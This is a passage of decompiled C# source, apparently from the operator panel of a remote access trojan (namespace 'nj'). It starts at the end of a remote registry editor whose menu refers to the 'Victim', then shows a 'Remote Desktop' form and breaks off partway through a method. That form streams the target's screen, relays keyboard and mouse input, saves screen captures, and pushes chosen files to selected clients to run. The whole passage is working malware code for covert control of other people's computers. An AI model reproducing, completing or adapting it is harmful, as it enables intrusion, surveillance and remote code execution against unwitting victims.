				this.RGk.Enabled = false;
			}
		}

		private void ToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			this.RGLIST_DoubleClick(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e);
		}

		private void ToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			Frm_registry frm_registry = new Frm_registry();
			frm_registry.Path = this.RGk.SelectedNode.FullPath + "\\";
			frm_registry.sk = this.sk;
			frm_registry.TextBox1.Text = "Name";
			frm_registry.ComboBox1.SelectedIndex = frm_registry.ComboBox1.Items.IndexOf("String");
			frm_registry.TextBox3.Text = "Value";
			frm_registry.Text = frm_registry.Path;
			frm_registry.ShowDialog(this);
		}

		private void ToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.RGLIST.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					this.sk.Send(string.Concat(new string[]
					{
						"RG",
						sokserver.Y,
						"@",
						sokserver.Y,
						this.RGk.SelectedNode.FullPath,
						"\\",
						sokserver.Y,
						listViewItem.Text
					}));
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ListViewToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.RGLIST.GridLines = true;
		}

		private void DetailsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.RGLIST.GridLines = false;
		}

		private void ColorLinesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.RGLIST.BackColor = colorDialog.Color;
			this.RGk.BackColor = colorDialog.Color;
		}

		private void VictimColorToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.RGLIST.ForeColor = colorDialog.Color;
			this.RGk.ForeColor = colorDialog.Color;
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class sc : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Timer1")]
		private System.Windows.Forms.Timer _Timer1;

		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("CheckBox3")]
		private CheckBox _CheckBox3;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("CheckBox2")]
		private CheckBox _CheckBox2;

		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		[AccessedThroughProperty("C1")]
		private ComboBox _C1;

		[AccessedThroughProperty("P")]
		private PictureBox _P;

		[AccessedThroughProperty("Timer3")]
		private System.Windows.Forms.Timer _Timer3;

		[AccessedThroughProperty("CheckBox4")]
		private CheckBox _CheckBox4;

		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		private Point point_1;

		private Point point_2;

		public bool IsActive;

		public int co;

		public string Folder;

		private Point NP;

		private Point op;

		public Client osk;

		public string QQ;

		public Client sk;

		public Size sz;

		internal virtual System.Windows.Forms.Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click_2);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		internal virtual CheckBox CheckBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox3_CheckedChanged_1);
				bool flag = this._CheckBox3 != null;
				if (flag)
				{
					this._CheckBox3.CheckedChanged -= value2;
				}
				this._CheckBox3 = value;
				flag = (this._CheckBox3 != null);
				if (flag)
				{
					this._CheckBox3.CheckedChanged += value2;
				}
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button1 = value;
			}
		}

		internal virtual CheckBox CheckBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox2 = value;
			}
		}

		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		internal virtual ComboBox C1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._C1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._C1 = value;
			}
		}

		internal virtual PictureBox P
		{
			[DebuggerNonUserCode]
			get
			{
				return this._P;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.P_MouseMove);
				EventHandler value3 = new EventHandler(this.P_MouseLeave);
				EventHandler value4 = new EventHandler(this.P_MouseEnter);
				bool flag = this._P != null;
				if (flag)
				{
					this._P.MouseMove -= value2;
					this._P.MouseLeave -= value3;
					this._P.MouseEnter -= value4;
				}
				this._P = value;
				flag = (this._P != null);
				if (flag)
				{
					this._P.MouseMove += value2;
					this._P.MouseLeave += value3;
					this._P.MouseEnter += value4;
				}
			}
		}

		internal virtual System.Windows.Forms.Timer Timer3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer3_Tick);
				bool flag = this._Timer3 != null;
				if (flag)
				{
					this._Timer3.Tick -= value2;
				}
				this._Timer3 = value;
				flag = (this._Timer3 != null);
				if (flag)
				{
					this._Timer3.Tick += value2;
				}
			}
		}

		internal virtual CheckBox CheckBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox4_CheckedChanged);
				bool flag = this._CheckBox4 != null;
				if (flag)
				{
					this._CheckBox4.CheckedChanged -= value2;
				}
				this._CheckBox4 = value;
				flag = (this._CheckBox4 != null);
				if (flag)
				{
					this._CheckBox4.CheckedChanged += value2;
				}
			}
		}

		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox1 = value;
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		public sc()
		{
			base.ResizeEnd += new EventHandler(this.sc_ResizeEnd);
			base.FormClosing += new FormClosingEventHandler(this.sc_FormClosing);
			base.Load += new EventHandler(this.sc_Load);
			base.MouseMove += new MouseEventHandler(this.sc_MouseMove);
			base.Paint += new PaintEventHandler(this.sc_Paint);
			base.Resize += new EventHandler(this.sc_Resize);
			base.ResizeBegin += new EventHandler(this.sc_ResizeBegin);
			sc.__ENCAddToList(this);
			this.co = 0;
			this.Folder = "";
			this.NP = default(Point);
			this.op = default(Point);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = sc.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = sc.__ENCList.Count == sc.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = sc.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = sc.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									sc.__ENCList[num] = sc.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						sc.__ENCList.RemoveRange(num, sc.__ENCList.Count - num);
						sc.__ENCList.Capacity = sc.__ENCList.Count;
					}
					sc.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(sc));
			this.Timer1 = new System.Windows.Forms.Timer(this.components);
			this.Panel1 = new Panel();
			this.CheckBox1 = new CheckBox();
			this.CheckBox4 = new CheckBox();
			this.Button2 = new Button();
			this.CheckBox3 = new CheckBox();
			this.CheckBox2 = new CheckBox();
			this.Button1 = new Button();
			this.ComboBox1 = new ComboBox();
			this.C1 = new ComboBox();
			this.P = new PictureBox();
			this.Timer3 = new System.Windows.Forms.Timer(this.components);
			this.ProgressBar1 = new ProgressBar();
			this.Panel1.SuspendLayout();
			((ISupportInitialize)this.P).BeginInit();
			this.SuspendLayout();
			this.Timer1.Interval = 500;
			this.Panel1.BackColor = Color.Black;
			this.Panel1.BorderStyle = BorderStyle.FixedSingle;
			this.Panel1.Controls.Add(this.CheckBox1);
			this.Panel1.Controls.Add(this.CheckBox4);
			this.Panel1.Controls.Add(this.Button2);
			this.Panel1.Controls.Add(this.CheckBox3);
			this.Panel1.Controls.Add(this.CheckBox2);
			this.Panel1.Controls.Add(this.Button1);
			this.Panel1.Controls.Add(this.ComboBox1);
			this.Panel1.Controls.Add(this.C1);
			this.Panel1.Dock = DockStyle.Top;
			Control arg_1E8_0 = this.Panel1;
			Point location = new Point(0, 0);
			arg_1E8_0.Location = location;
			this.Panel1.Name = "Panel1";
			Control arg_216_0 = this.Panel1;
			Size size = new Size(515, 31);
			arg_216_0.Size = size;
			this.Panel1.TabIndex = 4;
			this.CheckBox1.AutoSize = true;
			this.CheckBox1.Cursor = Cursors.Hand;
			this.CheckBox1.ForeColor = Color.LightSteelBlue;
			Control arg_26D_0 = this.CheckBox1;
			location = new Point(278, 4);
			arg_26D_0.Location = location;
			this.CheckBox1.Name = "CheckBox1";
			Control arg_298_0 = this.CheckBox1;
			size = new Size(56, 17);
			arg_298_0.Size = size;
			this.CheckBox1.TabIndex = 107;
			this.CheckBox1.Text = " Lines";
			this.CheckBox1.UseVisualStyleBackColor = true;
			this.CheckBox4.AutoSize = true;
			this.CheckBox4.ForeColor = Color.LightSteelBlue;
			Control arg_2FA_0 = this.CheckBox4;
			location = new Point(70, 5);
			arg_2FA_0.Location = location;
			this.CheckBox4.Name = "CheckBox4";
			Control arg_325_0 = this.CheckBox4;
			size = new Size(50, 17);
			arg_325_0.Size = size;
			this.CheckBox4.TabIndex = 107;
			this.CheckBox4.Text = "Save";
			this.CheckBox4.UseVisualStyleBackColor = true;
			this.Button2.Cursor = Cursors.Hand;
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.ForeColor = Color.LightSteelBlue;
			Control arg_397_0 = this.Button2;
			location = new Point(3, 5);
			arg_397_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_3C2_0 = this.Button2;
			size = new Size(61, 21);
			arg_3C2_0.Size = size;
			this.Button2.TabIndex = 4;
			this.Button2.Text = "Start";
			this.Button2.UseVisualStyleBackColor = true;
			this.CheckBox3.AutoSize = true;
			this.CheckBox3.Cursor = Cursors.Hand;
			this.CheckBox3.ForeColor = Color.LightSteelBlue;
			Control arg_437_0 = this.CheckBox3;
			location = new Point(204, 4);
			arg_437_0.Location = location;
			this.CheckBox3.Name = "CheckBox3";
			Control arg_462_0 = this.CheckBox3;
			size = new Size(76, 17);
			arg_462_0.Size = size;
			this.CheckBox3.TabIndex = 4;
			this.CheckBox3.Text = "Keyboard";
			this.CheckBox3.UseVisualStyleBackColor = true;
			this.CheckBox2.AutoSize = true;
			this.CheckBox2.Cursor = Cursors.Hand;
			this.CheckBox2.ForeColor = Color.LightSteelBlue;
			Control arg_4D7_0 = this.CheckBox2;
			location = new Point(136, 4);
			arg_4D7_0.Location = location;
			this.CheckBox2.Name = "CheckBox2";
			Control arg_502_0 = this.CheckBox2;
			size = new Size(62, 17);
			arg_502_0.Size = size;
			this.CheckBox2.TabIndex = 4;
			this.CheckBox2.Text = "Mouse";
			this.CheckBox2.UseVisualStyleBackColor = true;
			this.Button1.Cursor = Cursors.Hand;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_573_0 = this.Button1;
			location = new Point(3, 4);
			arg_573_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_59E_0 = this.Button1;
			size = new Size(60, 22);
			arg_59E_0.Size = size;
			this.Button1.TabIndex = 6;
			this.Button1.Text = "Run File";
			this.Button1.UseVisualStyleBackColor = true;
			this.ComboBox1.BackColor = Color.Black;
			this.ComboBox1.Dock = DockStyle.Right;
			this.ComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
			this.ComboBox1.FlatStyle = FlatStyle.Flat;
			this.ComboBox1.ForeColor = Color.LightSteelBlue;
			this.ComboBox1.FormattingEnabled = true;
			Control arg_63A_0 = this.ComboBox1;
			location = new Point(340, 0);
			arg_63A_0.Location = location;
			this.ComboBox1.Name = "ComboBox1";
			Control arg_665_0 = this.ComboBox1;
			size = new Size(90, 21);
			arg_665_0.Size = size;
			this.ComboBox1.TabIndex = 1;
			this.C1.BackColor = Color.Black;
			this.C1.Dock = DockStyle.Right;
			this.C1.DropDownStyle = ComboBoxStyle.DropDownList;
			this.C1.FlatStyle = FlatStyle.Flat;
			this.C1.ForeColor = Color.LightSteelBlue;
			this.C1.FormattingEnabled = true;
			this.C1.Items.AddRange(new object[]
			{
				"%100",
				"%90",
				"%80",
				"%70",
				"%60",
				"%50",
				"%40",
				"%30",
				"%20"
			});
			Control arg_759_0 = this.C1;
			location = new Point(430, 0);
			arg_759_0.Location = location;
			this.C1.Name = "C1";
			Control arg_784_0 = this.C1;
			size = new Size(83, 21);
			arg_784_0.Size = size;
			this.C1.TabIndex = 0;
			this.P.BackColor = Color.Black;
			this.P.Dock = DockStyle.Fill;
			Control arg_7C7_0 = this.P;
			location = new Point(0, 31);
			arg_7C7_0.Location = location;
			this.P.Name = "P";
			Control arg_7F8_0 = this.P;
			size = new Size(515, 248);
			arg_7F8_0.Size = size;
			this.P.SizeMode = PictureBoxSizeMode.StretchImage;
			this.P.TabIndex = 8;
			this.P.TabStop = false;
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_847_0 = this.ProgressBar1;
			location = new Point(0, 269);
			arg_847_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_875_0 = this.ProgressBar1;
			size = new Size(515, 10);
			arg_875_0.Size = size;
			this.ProgressBar1.TabIndex = 107;
			SizeF autoScaleDimensions = new SizeF(7f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(515, 279);
			this.ClientSize = size;
			this.Controls.Add(this.ProgressBar1);
			this.Controls.Add(this.P);
			this.Controls.Add(this.Panel1);
			this.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ForeColor = SystemColors.Control;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "sc";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Remote Desktop";
			this.TransparencyKey = Color.Fuchsia;
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			((ISupportInitialize)this.P).EndInit();
			this.ResumeLayout(false);
		}

		private void sc_FormClosing(object sender, FormClosingEventArgs e)
		{
			bool flag = this.sk != null;
			if (flag)
			{
				this.sk.CN = false;
			}
		}

		private void sc_Load(object sender, EventArgs e)
		{
			this.Timer3.Start();
			PictureBox p = this.P;
			PictureBox obj = p;
			checked
			{
				lock (obj)
				{
					this.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(sokserver.vno(this.osk.L)));
					this.Text = this.QQ;
					Control p2 = this.P;
					int num = 0;
					do
					{
						Size size = this.QZ(num);
						this.ComboBox1.Items.Add(Conversions.ToString(size.Width) + "," + Conversions.ToString(size.Height));
						num++;
					}
					while (num <= 13);
					p2.KeyUp += new KeyEventHandler(this.KUP);
					p2.KeyDown += new KeyEventHandler(this.KDW);
					this.ComboBox1.SelectedIndex = 0;
				}
				this.Folder = this.osk.Folder + "Desktop_Capture\\";
				bool flag = !Directory.Exists(this.Folder);
				if (flag)
				{
					Directory.CreateDirectory(this.Folder);
				}
				this.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e);
				int num2 = 1;
				int num3;
				do
				{
					this.ComboBox1.Items.Add(num2);
					num2++;
					num3 = 10;
				}
				while (num2 <= num3);
				this.P.Image = new Bitmap(this.sz.Width, this.sz.Height);
				this.C1.SelectedIndex = 4;
				this.ComboBox1.SelectedIndex = 4;
			}
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Stop", false) == 0;
			if (flag)
			{
				this.Button1.Text = "Start";
				this.sk.Send("!!");
				this.ComboBox1.Enabled = true;
			}
			else
			{
				this.ComboBox1.Enabled = false;
				this.Button1.Text = "Stop";
				this.sk.Send(string.Concat(new string[]
				{
					"!",
					sokserver.Y,
					this.sk.ip(),
					sokserver.Y,
					Strings.Split(this.ComboBox1.Text, ",", -1, CompareMethod.Binary)[0],
					sokserver.Y,
					Strings.Split(this.ComboBox1.Text, ",", -1, CompareMethod.Binary)[1],
					sokserver.Y,
					Conversions.ToString(0)
				}));
			}
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = (this.CheckBox1.Checked & Operators.CompareString(this.Button1.Text, "Start", false) != 0) && this.NP != this.op;
			if (flag)
			{
				this.op = this.NP;
				this.sk.Send(string.Concat(new string[]
				{
					"@",
					sokserver.Y,
					Conversions.ToString(this.op.X),
					sokserver.Y,
					Conversions.ToString(this.op.Y),
					sokserver.Y,
					Conversions.ToString(1)
				}));
			}
			flag = (!this.osk.CN | !this.sk.CN);
			if (flag)
			{
				this.sk.CN = false;
				this.Panel1.Enabled = false;
				this.Text = "Disconnected!! " + this.QQ;
			}
		}

		private void sc_MouseMove(object sender, MouseEventArgs e)
		{
			bool flag = e.Y < 20;
			if (flag)
			{
				this.Panel1.BringToFront();
			}
			else
			{
				this.Panel1.SendToBack();
				PictureBox p = this.P;
				PictureBox obj = p;
				lock (obj)
				{
					flag = ((!this.P.Focused & this.CheckBox2.Checked) | this.CheckBox1.Checked);
					if (flag)
					{
						this.P.Focus();
					}
				}
			}
			this.NP = checked(new Point((int)Math.Round(Math.Round(unchecked((double)e.X * ((double)this.sz.Width / (double)this.P.Width)))), (int)Math.Round(Math.Round(unchecked((double)e.Y * ((double)this.sz.Height / (double)this.P.Height))))));
		}

		private void sc_Paint(object sender, PaintEventArgs e)
		{
			this.Panel1.Enabled = true;
		}

		private void sc_Resize(object sender, EventArgs e)
		{
			PictureBox p = this.P;
			PictureBox obj = p;
			lock (obj)
			{
				this.Panel1.Left = checked((int)Math.Round(Math.Round((double)this.Width / 2.0)) - (int)Math.Round(Math.Round((double)this.Panel1.Width / 2.0)));
			}
		}

		private void sc_ResizeBegin(object sender, EventArgs e)
		{
			PictureBox p = this.P;
			PictureBox obj = p;
			lock (obj)
			{
			}
		}

		private void sc_ResizeEnd(object sender, EventArgs e)
		{
			PictureBox p = this.P;
			PictureBox obj = p;
			lock (obj)
			{
			}
		}

		public Size QZ(int q)
		{
			Size size = new Size((Point)this.sz);
			checked
			{
				Size result;
				switch (q)
				{
				case 0:
					result = this.sz;
					return result;
				case 1:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 1.1));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 1.1));
					break;
				case 2:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 1.3));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 1.3));
					break;
				case 3:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 1.5));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 1.5));
					break;
				case 4:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 1.9));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 1.9));
					break;
				case 5:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 2.0));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 2.0));
					break;
				case 6:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 2.1));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 2.1));
					break;
				case 7:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 2.2));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 2.2));
					break;
				case 8:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 2.5));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 2.5));
					break;
				case 9:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 3.0));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 3.0));
					break;
				case 10:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 3.5));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 3.5));
					break;
				case 11:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 4.0));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 4.0));
					break;
				case 12:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 5.0));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 5.0));
					break;
				case 13:
					size.Width = (int)Math.Round(Math.Round((double)size.Width / 6.0));
					size.Height = (int)Math.Round(Math.Round((double)size.Height / 6.0));
					break;
				}
				size.Width = Conversions.ToInteger(Strings.Mid(size.Width.ToString(), 1, size.Width.ToString().Length - 1) + Conversions.ToString(0));
				size.Height = Conversions.ToInteger(Strings.Mid(size.Height.ToString(), 1, size.Height.ToString().Length - 1) + Conversions.ToString(0));
				result = size;
				return result;
			}
		}

		private void CheckBox3_CheckedChanged(object sender, EventArgs e)
		{
		}

		public void KDW(object s, KeyEventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Start", false) != 0;
			if (flag)
			{
				this.P.Focus();
				flag = this.CheckBox2.Checked;
				if (flag)
				{
					Keys keyCode = e.KeyCode;
					bool arg_70_0;
					if (keyCode != Keys.Shift && keyCode != Keys.ShiftKey)
					{
						if (keyCode != Keys.LShiftKey)
						{
							if (keyCode != Keys.RShiftKey)
							{
								arg_70_0 = false;
								goto IL_70;
							}
						}
					}
					arg_70_0 = true;
					IL_70:
					bool flag2 = arg_70_0;
					if (flag2)
					{
						this.sk.Send(string.Concat(new string[]
						{
							"#",
							sokserver.Y,
							Conversions.ToString(0),
							sokserver.Y,
							Conversions.ToString(16)
						}));
					}
					else
					{
						this.sk.Send(string.Concat(new string[]
						{
							"#",
							sokserver.Y,
							Conversions.ToString(0),
							sokserver.Y,
							Conversions.ToString((int)e.KeyCode)
						}));
					}
				}
			}
		}

		public void KUP(object s, KeyEventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Start", false) != 0;
			if (flag)
			{
				this.P.Focus();
				flag = this.CheckBox2.Checked;
				if (flag)
				{
					Keys keyCode = e.KeyCode;
					bool arg_70_0;
					if (keyCode != Keys.Shift && keyCode != Keys.ShiftKey)
					{
						if (keyCode != Keys.LShiftKey)
						{
							if (keyCode != Keys.RShiftKey)
							{
								arg_70_0 = false;
								goto IL_70;
							}
						}
					}
					arg_70_0 = true;
					IL_70:
					bool flag2 = arg_70_0;
					if (flag2)
					{
						this.sk.Send(string.Concat(new string[]
						{
							"#",
							sokserver.Y,
							Conversions.ToString(2),
							sokserver.Y,
							Conversions.ToString(16)
						}));
					}
					else
					{
						this.sk.Send(string.Concat(new string[]
						{
							"#",
							sokserver.Y,
							Conversions.ToString(2),
							sokserver.Y,
							Conversions.ToString((int)e.KeyCode)
						}));
					}
				}
			}
		}

		private void P_Click(object sender, EventArgs e)
		{
		}

		private void P_MouseWheel(object sender, MouseEventArgs e)
		{
			PictureBox p = this.P;
			PictureBox obj = p;
			lock (obj)
			{
				bool flag = this.CheckBox1.Checked && Operators.CompareString(this.Button1.Text, "Start", false) != 0;
				if (flag)
				{
					this.sk.Send(string.Concat(new string[]
					{
						"@",
						sokserver.Y,
						Conversions.ToString(e.Delta),
						sokserver.Y,
						Conversions.ToString(this.op.Y),
						sokserver.Y,
						Conversions.ToString(2048)
					}));
				}
			}
		}

		private void P1_MouseDown(object sender, MouseEventArgs e)
		{
			PictureBox p = this.P;
			PictureBox obj = p;
			lock (obj)
			{
				bool flag = this.CheckBox1.Checked && Operators.CompareString(this.Button1.Text, "Start", false) != 0;
				if (flag)
				{
					Point point = checked(new Point((int)Math.Round(Math.Round(unchecked((double)e.X * ((double)this.sz.Width / (double)this.P.Width)))), (int)Math.Round(Math.Round(unchecked((double)e.Y * ((double)this.sz.Height / (double)this.P.Height))))));
					flag = (e.Button == MouseButtons.Left);
					int value;
					if (flag)
					{
						value = 2;
					}
					flag = (e.Button == MouseButtons.Right);
					if (flag)
					{
						value = 8;
					}
					this.sk.Send(string.Concat(new string[]
					{
						"@",
						sokserver.Y,
						Conversions.ToString(point.X),
						sokserver.Y,
						Conversions.ToString(point.Y),
						sokserver.Y,
						Conversions.ToString(value)
					}));
				}
			}
		}

		private void P1_MouseUp(object sender, MouseEventArgs e)
		{
			bool flag = this.CheckBox1.Checked && Operators.CompareString(this.Button1.Text, "Start", false) != 0;
			if (flag)
			{
				Point point = checked(new Point((int)Math.Round(Math.Round(unchecked((double)e.X * ((double)this.sz.Width / (double)this.P.Width)))), (int)Math.Round(Math.Round(unchecked((double)e.Y * ((double)this.sz.Height / (double)this.P.Height))))));
				flag = (e.Button == MouseButtons.Left);
				int value;
				if (flag)
				{
					value = 4;
				}
				flag = (e.Button == MouseButtons.Right);
				if (flag)
				{
					value = 16;
				}
				this.sk.Send(string.Concat(new string[]
				{
					"@",
					sokserver.Y,
					Conversions.ToString(point.X),
					sokserver.Y,
					Conversions.ToString(point.Y),
					sokserver.Y,
					Conversions.ToString(value)
				}));
			}
		}

		private void PictureBox1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.FileName = "";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				bool flag2 = true;
				string text = Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag2));
				byte[] array = FN.SB(ref text);
				MemoryStream memoryStream = new MemoryStream();
				string text2 = "rn" + sokserver.Y + new FileInfo(openFileDialog.FileName).Extension + sokserver.Y;
				memoryStream.Write(FN.SB(ref text2), 0, text2.Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(sokserver.SendTo), 1);
				thread.Start(new object[]
				{
					MyProject.Forms.Frm_Main.L1V.SelectedItems,
					memoryStream.ToArray(),
					Color.Green
				});
			}
		}

		private void Label2_Click(object sender, EventArgs e)
		{
		}

		private void btnSalvar_Click(object sender, EventArgs e)
		{
		}

		private void Timer3_Tick(object sender, EventArgs e)
		{
			bool flag = this.ProgressBar1.Value == 100;
			if (flag)
			{
				this.ProgressBar1.Value = 0;
			}
			else
			{
				this.ProgressBar1.Value = checked((int)Math.Round(unchecked(Conversion.Val(this.ProgressBar1.Value) + Conversion.Val(10))));
			}
		}

		private void Button2_Click_2(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Stop", false) == 0;
			if (flag)
			{
				this.Button1.Text = "Start";
				this.sk.Send("!!");
				this.ComboBox1.Enabled = true;
			}
			else
			{
				this.ComboBox1.Enabled = false;
				this.Button1.Text = "Stop";
				this.sk.Send(string.Concat(new string[]
				{
